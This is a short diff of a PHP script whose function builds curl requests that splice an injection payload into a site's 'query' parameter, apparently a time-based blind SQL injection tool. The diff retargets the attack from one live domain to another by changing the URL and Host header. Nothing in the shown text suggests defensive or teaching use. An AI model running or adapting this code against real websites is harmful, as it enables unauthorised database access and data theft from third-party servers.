@@ -532,7 +532,7 @@ function kotnova($injection, $i, $sleep_timer, $state)
     //$curl = curl_init();
     global $curl;
     curl_setopt_array($curl, array(
-        CURLOPT_URL => "https://master.kotnova.com/sql.php?local=1&query=Africa'%2b" . $injection . "%2b'",
+        CURLOPT_URL => "https://kever.io/sql.php?local=1&query=Africa'%2b" . $injection . "%2b'",
         CURLOPT_RETURNTRANSFER => true,
         CURLOPT_ENCODING => '',
         CURLOPT_MAXREDIRS => 10,
@@ -552,7 +552,7 @@ function kotnova($injection, $i, $sleep_timer, $state)
             'Sec-Fetch-Mode: navigate',
             'Sec-Fetch-User: ?1',
             'Sec-Fetch-Dest: document',
-            'host: master.kotnova.com'
+            'host: kever.io'
         ),
     ));
 
